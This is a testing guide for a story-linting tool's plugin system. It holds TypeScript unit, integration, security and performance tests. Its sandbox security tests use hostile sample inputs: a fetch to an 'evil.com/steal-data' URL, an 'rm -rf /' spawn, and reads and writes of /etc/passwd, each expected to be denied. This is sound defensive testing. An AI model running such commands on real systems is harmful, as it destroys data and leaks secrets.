# Plugin Testing

## Overview

Plugin testing ensures that third-party plugins work correctly within the Story Linter ecosystem. This document outlines comprehensive strategies for testing plugins, including unit tests, integration tests, security tests, and performance benchmarks.

## Plugin Test Framework

### Core Testing Infrastructure

```typescript
interface PluginTestFramework {
  // Test environment
  sandbox: PluginSandbox
  host: MockHost
  
  // Test utilities
  fixtures: PluginFixtures
  assertions: PluginAssertions
  mocks: PluginMocks
  
  // Test runners
  runner: PluginTestRunner
  coverage: CoverageReporter
}

class PluginTestEnvironment {
  private sandbox: PluginSandbox
  private context: MockPluginContext
  
  async setup(plugin: Plugin): Promise<void> {
    // Create isolated sandbox
    this.sandbox = new PluginSandbox({
      permissions: plugin.manifest.permissions,
      resources: {
        memory: 100 * 1024 * 1024, // 100MB
        cpu: 0.5,
        timeout: 30000
      }
    })
    
    // Initialize mock context
    this.context = this.createMockContext()
    
    // Load plugin in sandbox
    await this.sandbox.load(plugin)
  }
  
  private createMockContext(): MockPluginContext {
    return {
      validation: new MockValidationAPI(),
      schema: new MockSchemaAPI(),
      fileSystem: new MockFileSystemAPI(),
      configuration: new MockConfigurationAPI(),
      events: new MockEventAPI(),
      logger: new MockLogger(),
      storage: new MockStorageAPI()
    }
  }
}
```

### Plugin Test Suite Base

```typescript
abstract class PluginTestSuite {
  protected plugin: Plugin
  protected env: PluginTestEnvironment
  
  async beforeAll(): Promise<void> {
    this.plugin = await this.loadPlugin()
    this.env = new PluginTestEnvironment()
    await this.env.setup(this.plugin)
  }
  
  async afterAll(): Promise<void> {
    await this.env.teardown()
  }
  
  abstract loadPlugin(): Promise<Plugin>
  
  // Common test utilities
  protected async activatePlugin(): Promise<void> {
    await this.plugin.activate(this.env.context)
  }
  
  protected async deactivatePlugin(): Promise<void> {
    await this.plugin.deactivate()
  }
  
  protected createMockFile(content: string): ParsedFile {
    return {
      path: 'test.md',
      content,
      ast: parseMarkdown(content)
    }
  }
}
```

## Unit Testing Plugins

### Plugin Lifecycle Tests

```typescript
describe('Plugin Lifecycle', () => {
  let plugin: TestPlugin
  let context: MockPluginContext
  
  beforeEach(() => {
    plugin = new TestPlugin()
    context = createMockContext()
  })
  
  describe('Activation', () => {
    it('should activate successfully', async () => {
      await expect(plugin.activate(context)).resolves.not.toThrow()
      expect(plugin.isActive).toBe(true)
    })
    
    it('should register components on activation', async () => {
      await plugin.activate(context)
      
      expect(context.validation.registerValidator).toHaveBeenCalledWith(
        expect.objectContaining({
          id: 'test-validator'
        })
      )
      
      expect(context.commands.registerCommand).toHaveBeenCalledWith(
        'test-plugin.command',
        expect.any(Function)
      )
    })
    
    it('should handle activation errors gracefully', async () => {
      context.validation.registerValidator.mockRejectedValue(
        new Error('Registration failed')
      )
      
      await expect(plugin.activate(context)).rejects.toThrow(
        'Failed to activate plugin'
      )
      expect(plugin.isActive).toBe(false)
    })
  })
  
  describe('Deactivation', () => {
    beforeEach(async () => {
      await plugin.activate(context)
    })
    
    it('should deactivate successfully', async () => {
      await expect(plugin.deactivate()).resolves.not.toThrow()
      expect(plugin.isActive).toBe(false)
    })
    
    it('should clean up resources on deactivation', async () => {
      const disposable = { dispose: jest.fn() }
      plugin.disposables.push(disposable)
      
      await plugin.deactivate()
      
      expect(disposable.dispose).toHaveBeenCalled()
    })
    
    it('should handle multiple deactivations', async () => {
      await plugin.deactivate()
      await expect(plugin.deactivate()).resolves.not.toThrow()
    })
  })
})
```

### Validator Plugin Tests

```typescript
describe('Custom Validator Plugin', () => {
  let validator: CustomValidator
  let context: ValidationContext
  
  beforeEach(() => {
    validator = new CustomValidator({
      minSentenceLength: 5,
      maxSentenceLength: 50
    })
    
    context = createMockValidationContext()
  })
  
  describe('validateFile', () => {
    it('should detect short sentences', async () => {
      const file = createParsedFile(`
        This is good.
        Bad.
        This sentence is also fine.
      `)
      
      const issues = await validator.validateFile(file, context)
      
      expect(issues).toHaveLength(1)
      expect(issues[0]).toMatchObject({
        type: 'sentence-too-short',
        severity: 'warning',
        line: 3,
        message: expect.stringContaining('too short')
      })
    })
    
    it('should detect long sentences', async () => {
      const longSentence = Array(60).fill('word').join(' ') + '.'
      const file = createParsedFile(longSentence)
      
      const issues = await validator.validateFile(file, context)
      
      expect(issues).toHaveLength(1)
      expect(issues[0].type).toBe('sentence-too-long')
    })
    
    it('should respect configuration', async () => {
      validator = new CustomValidator({
        minSentenceLength: 1,
        maxSentenceLength: 100
      })
      
      const file = createParsedFile('Short. Is. OK.')
      const issues = await validator.validateFile(file, context)
      
      expect(issues).toHaveLength(0)
    })
    
    it('should handle edge cases', async () => {
      const edgeCases = [
        '',                          // Empty content
        '...',                       // Only punctuation
        'No period at end',          // Missing punctuation
        'Multiple??? Questions???',  // Multiple punctuation
      ]
      
      for (const content of edgeCases) {
        const file = createParsedFile(content)
        const issues = await validator.validateFile(file, context)
        
        // Should not throw
        expect(Array.isArray(issues)).toBe(true)
      }
    })
  })
})
```

### Schema Extractor Plugin Tests

```typescript
describe('Schema Extractor Plugin', () => {
  let extractor: CustomSchemaExtractor
  
  beforeEach(() => {
    extractor = new CustomSchemaExtractor({
      patterns: {
        emotion: [
          /felt (\w+)/i,
          /was (\w+)/i,
          /seemed (\w+)/i
        ]
      }
    })
  })
  
  describe('extract', () => {
    it('should extract emotion patterns', () => {
      const content = parseContent(`
        Alice felt happy when she saw the garden.
        Bob was excited about the adventure.
        The room seemed gloomy and dark.
      `)
      
      const results = extractor.extract(content)
      
      expect(results.emotions).toContainEqual({
        character: 'Alice',
        emotion: 'happy',
        context: expect.stringContaining('garden')
      })
      
      expect(results.emotions).toContainEqual({
        character: 'Bob',
        emotion: 'excited',
        context: expect.stringContaining('adventure')
      })
    })
    
    it('should handle overlapping patterns', () => {
      const content = parseContent(
        'She felt sad but was trying to seem happy.'
      )
      
      const results = extractor.extract(content)
      
      expect(results.emotions).toHaveLength(3)
      expect(results.emotions.map(e => e.emotion)).toContain('sad')
      expect(results.emotions.map(e => e.emotion)).toContain('happy')
    })
  })
})
```

## Integration Testing

### Plugin Host Integration

```typescript
describe('Plugin Host Integration', () => {
  let host: PluginHost
  let plugin: TestPlugin
  
  beforeAll(async () => {
    host = new PluginHost({
      pluginPath: './test-plugins'
    })
    
    await host.initialize()
  })
  
  it('should load and activate plugin', async () => {
    const pluginId = await host.loadPlugin('./test-plugin')
    
    expect(pluginId).toBeDefined()
    expect(host.getPlugin(pluginId)).toBeDefined()
    expect(host.isActive(pluginId)).toBe(true)
  })
  
  it('should handle plugin communication', async () => {
    const pluginId = await host.loadPlugin('./communication-test-plugin')
    
    // Plugin should be able to emit events
    const eventPromise = new Promise(resolve => {
      host.on('custom:event', resolve)
    })
    
    await host.sendMessage(pluginId, { type: 'emit-event' })
    
    const event = await eventPromise
    expect(event).toMatchObject({
      source: pluginId,
      data: expect.any(Object)
    })
  })
  
  it('should enforce permissions', async () => {
    const restrictedPlugin = await host.loadPlugin('./restricted-plugin')
    
    // Plugin without file write permission
    const result = await host.sendMessage(restrictedPlugin, {
      type: 'write-file',
      path: '/etc/passwd',
      content: 'malicious'
    })
    
    expect(result.error).toBeDefined()
    expect(result.error.code).toBe('PERMISSION_DENIED')
  })
  
  it('should handle plugin crashes', async () => {
    const crashyPlugin = await host.loadPlugin('./crashy-plugin')
    
    // Trigger crash
    await host.sendMessage(crashyPlugin, { type: 'crash' })
    
    // Host should remain stable
    expect(host.isRunning()).toBe(true)
    
    // Plugin should be marked as crashed
    expect(host.getPluginStatus(crashyPlugin)).toBe('crashed')
    
    // Should be able to restart
    await host.restartPlugin(crashyPlugin)
    expect(host.getPluginStatus(crashyPlugin)).toBe('active')
  })
})
```

### Plugin API Integration

```typescript
describe('Plugin API Integration', () => {
  let plugin: TestPlugin
  let validationEngine: ValidationEngine
  
  beforeAll(async () => {
    plugin = await loadPlugin('./validator-plugin')
    validationEngine = new ValidationEngine()
    
    await validationEngine.registerPlugin(plugin)
  })
  
  it('should integrate with validation pipeline', async () => {
    const files = [
      createFile('chapter1.md', '# Chapter 1\nContent'),
      createFile('chapter2.md', '# Chapter 2\nMore content')
    ]
    
    const results = await validationEngine.validate(files)
    
    // Should include results from plugin validator
    const pluginIssues = results.issues.filter(
      i => i.source === plugin.id
    )
    
    expect(pluginIssues.length).toBeGreaterThan(0)
  })
  
  it('should respect plugin configuration', async () => {
    await validationEngine.configurePlugin(plugin.id, {
      enabled: false
    })
    
    const results = await validationEngine.validate([
      createFile('test.md', 'Test content')
    ])
    
    const pluginIssues = results.issues.filter(
      i => i.source === plugin.id
    )
    
    expect(pluginIssues).toHaveLength(0)
  })
})
```

## Security Testing

### Plugin Sandboxing Tests

```typescript
describe('Plugin Security', () => {
  let sandbox: PluginSandbox
  let maliciousPlugin: Plugin
  
  beforeEach(async () => {
    sandbox = new PluginSandbox({
      strict: true
    })
    
    maliciousPlugin = await loadPlugin('./malicious-plugin')
  })
  
  it('should prevent file system access outside sandbox', async () => {
    const result = await sandbox.execute(maliciousPlugin, {
      action: 'readFile',
      path: '/etc/passwd'
    })
    
    expect(result.error).toBeDefined()
    expect(result.error.code).toBe('ACCESS_DENIED')
  })
  
  it('should prevent network access', async () => {
    const result = await sandbox.execute(maliciousPlugin, {
      action: 'fetch',
      url: 'https://evil.com/steal-data'
    })
    
    expect(result.error).toBeDefined()
    expect(result.error.code).toBe('NETWORK_DISABLED')
  })
  
  it('should prevent process spawning', async () => {
    const result = await sandbox.execute(maliciousPlugin, {
      action: 'spawn',
      command: 'rm -rf /'
    })
    
    expect(result.error).toBeDefined()
    expect(result.error.code).toBe('SPAWN_DISABLED')
  })
  
  it('should enforce memory limits', async () => {
    const result = await sandbox.execute(maliciousPlugin, {
      action: 'allocateMemory',
      size: 1024 * 1024 * 1024 // 1GB
    })
    
    expect(result.error).toBeDefined()
    expect(result.error.code).toBe('MEMORY_LIMIT_EXCEEDED')
  })
  
  it('should enforce CPU limits', async () => {
    const result = await sandbox.execute(maliciousPlugin, {
      action: 'infiniteLoop'
    })
    
    expect(result.error).toBeDefined()
    expect(result.error.code).toBe('TIMEOUT')
  })
})
```

### Permission Testing

```typescript
describe('Plugin Permissions', () => {
  let permissionManager: PermissionManager
  
  beforeEach(() => {
    permissionManager = new PermissionManager()
  })
  
  it('should enforce declared permissions', async () => {
    const plugin = {
      manifest: {
        permissions: ['fs:read', 'validation:register']
      }
    }
    
    // Allowed operations
    expect(permissionManager.check(plugin, 'fs:read')).toBe(true)
    expect(permissionManager.check(plugin, 'validation:register')).toBe(true)
    
    // Denied operations
    expect(permissionManager.check(plugin, 'fs:write')).toBe(false)
    expect(permissionManager.check(plugin, 'network:*')).toBe(false)
  })
  
  it('should validate permission requests', () => {
    const validPermissions = [
      'fs:read',
      'fs:write:/tmp/*',
      'validation:register',
      'schema:read'
    ]
    
    const invalidPermissions = [
      'fs:write:/*',        // Too broad
      'system:*',           // Wildcard system access
      'unknown:permission'  // Unknown permission
    ]
    
    validPermissions.forEach(perm => {
      expect(permissionManager.isValid(perm)).toBe(true)
    })
    
    invalidPermissions.forEach(perm => {
      expect(permissionManager.isValid(perm)).toBe(false)
    })
  })
})
```

## Performance Testing

### Plugin Performance Benchmarks

```typescript
describe('Plugin Performance', () => {
  let plugin: TestPlugin
  let benchmark: PluginBenchmark
  
  beforeAll(async () => {
    plugin = await loadPlugin('./performance-test-plugin')
    benchmark = new PluginBenchmark()
  })
  
  it('should complete validation within time limit', async () => {
    const largeFile = generateLargeFile(1000000) // 1MB
    
    const result = await benchmark.measure(async () => {
      await plugin.validateFile(largeFile)
    })
    
    expect(result.duration).toBeLessThan(1000) // 1 second
    expect(result.memoryUsed).toBeLessThan(50 * 1024 * 1024) // 50MB
  })
  
  it('should handle concurrent operations efficiently', async () => {
    const files = Array(100).fill(null).map((_, i) => 
      createFile(`file${i}.md`, 'Test content')
    )
    
    const result = await benchmark.measureConcurrent(
      files.map(file => () => plugin.validateFile(file)),
      { concurrency: 10 }
    )
    
    expect(result.averageDuration).toBeLessThan(100) // 100ms per file
    expect(result.throughput).toBeGreaterThan(50) // 50 files/second
  })
  
  it('should not leak memory', async () => {
    const initialMemory = process.memoryUsage().heapUsed
    
    // Run many iterations
    for (let i = 0; i < 1000; i++) {
      await plugin.validateFile(createFile('test.md', 'Content'))
    }
    
    // Force garbage collection
    if (global.gc) global.gc()
    
    const finalMemory = process.memoryUsage().heapUsed
    const memoryIncrease = finalMemory - initialMemory
    
    expect(memoryIncrease).toBeLessThan(10 * 1024 * 1024) // 10MB max
  })
})
```

### Load Testing

```typescript
describe('Plugin Load Testing', () => {
  let loadTester: PluginLoadTester
  
  beforeAll(() => {
    loadTester = new PluginLoadTester({
      plugin: './load-test-plugin',
      duration: 60000, // 1 minute
      concurrentUsers: 50
    })
  })
  
  it('should handle sustained load', async () => {
    const results = await loadTester.run({
      scenario: 'sustained-validation',
      operations: [
        { type: 'validate', weight: 0.7 },
        { type: 'extract-schema', weight: 0.2 },
        { type: 'format-output', weight: 0.1 }
      ]
    })
    
    expect(results.successRate).toBeGreaterThan(0.99)
    expect(results.averageResponseTime).toBeLessThan(200)
    expect(results.errors).toHaveLength(0)
  })
})
```

## Plugin Development Testing

### Plugin Scaffold Testing

```typescript
describe('Plugin Scaffold', () => {
  let scaffolder: PluginScaffolder
  
  beforeEach(() => {
    scaffolder = new PluginScaffolder()
  })
  
  it('should generate valid plugin structure', async () => {
    const pluginDir = await scaffolder.create({
      name: 'test-plugin',
      type: 'validator',
      typescript: true
    })
    
    // Verify structure
    expect(await exists(path.join(pluginDir, 'package.json'))).toBe(true)
    expect(await exists(path.join(pluginDir, 'src/index.ts'))).toBe(true)
    expect(await exists(path.join(pluginDir, 'tsconfig.json'))).toBe(true)
    expect(await exists(path.join(pluginDir, 'test'))).toBe(true)
    
    // Verify package.json
    const packageJson = await readJSON(path.join(pluginDir, 'package.json'))
    expect(packageJson.main).toBe('dist/index.js')
    expect(packageJson.types).toBe('dist/index.d.ts')
    
    // Should compile without errors
    await expect(compile(pluginDir)).resolves.not.toThrow()
  })
})
```

### Plugin Test Helpers

```typescript
class PluginTestHelpers {
  static createMockContext(overrides?: Partial<PluginContext>): PluginContext {
    return {
      validation: createMockValidationAPI(),
      schema: createMockSchemaAPI(),
      fileSystem: createMockFileSystemAPI(),
      logger: createMockLogger(),
      ...overrides
    }
  }
  
  static async testValidator(
    validator: Validator,
    testCases: ValidatorTestCase[]
  ): Promise<TestResults> {
    const results: TestResult[] = []
    
    for (const testCase of testCases) {
      const context = this.createMockContext(testCase.context)
      const issues = await validator.validateFile(testCase.file, context)
      
      const passed = this.matchesExpectation(issues, testCase.expected)
      
      results.push({
        name: testCase.name,
        passed,
        actual: issues,
        expected: testCase.expected
      })
    }
    
    return { results, summary: this.summarize(results) }
  }
  
  static async measurePluginPerformance(
    plugin: Plugin,
    workload: Workload
  ): Promise<PerformanceMetrics> {
    const metrics = new PerformanceMetrics()
    
    await plugin.activate(this.createMockContext())
    
    for (const operation of workload.operations) {
      const start = performance.now()
      
      await operation.execute(plugin)
      
      const duration = performance.now() - start
      metrics.record(operation.name, duration)
    }
    
    await plugin.deactivate()
    
    return metrics
  }
}
```

## Plugin Testing Best Practices

### Test Organization

```typescript
// Good: Well-organized plugin tests
describe('MyPlugin', () => {
  describe('Lifecycle', () => {
    // Activation/deactivation tests
  })
  
  describe('Validators', () => {
    describe('SentenceValidator', () => {
      // Specific validator tests
    })
  })
  
  describe('Integration', () => {
    // Integration with host
  })
  
  describe('Performance', () => {
    // Performance benchmarks
  })
  
  describe('Security', () => {
    // Security tests
  })
})
```

### Mock Usage

```typescript
// Good: Proper mock setup
class PluginTest {
  private mockContext: MockPluginContext
  
  beforeEach() {
    this.mockContext = {
      validation: {
        registerValidator: jest.fn().mockResolvedValue({ dispose: jest.fn() })
      },
      logger: {
        info: jest.fn(),
        error: jest.fn(),
        warn: jest.fn()
      },
      events: {
        on: jest.fn().mockReturnValue({ dispose: jest.fn() }),
        emit: jest.fn().mockResolvedValue(undefined)
      }
    }
  }
  
  it('should register validator', async () => {
    await plugin.activate(this.mockContext)
    
    expect(this.mockContext.validation.registerValidator)
      .toHaveBeenCalledWith(expect.objectContaining({
        id: 'my-validator',
        validate: expect.any(Function)
      }))
  })
}
```

### Error Testing

```typescript
// Good: Comprehensive error testing
describe('Error Handling', () => {
  it('should handle API errors gracefully', async () => {
    context.schema.getSchema.mockRejectedValue(
      new Error('Schema not found')
    )
    
    const result = await plugin.validateWithSchema(file)
    
    expect(result.issues).toContainEqual(
      expect.objectContaining({
        type: 'plugin-error',
        message: expect.stringContaining('Schema not available')
      })
    )
    
    expect(context.logger.error).toHaveBeenCalled()
  })
})
```

## Future Enhancements

1. **Automated Plugin Testing**
   - CI/CD integration
   - Automated compatibility testing
   - Performance regression detection

2. **Plugin Test Generation**
   - AI-based test generation
   - Property-based testing
   - Mutation testing

3. **Visual Plugin Testing**
   - UI component testing
   - Visual regression testing
   - Interactive test debugging

4. **Plugin Certification**
   - Security auditing
   - Performance certification
   - Compatibility verification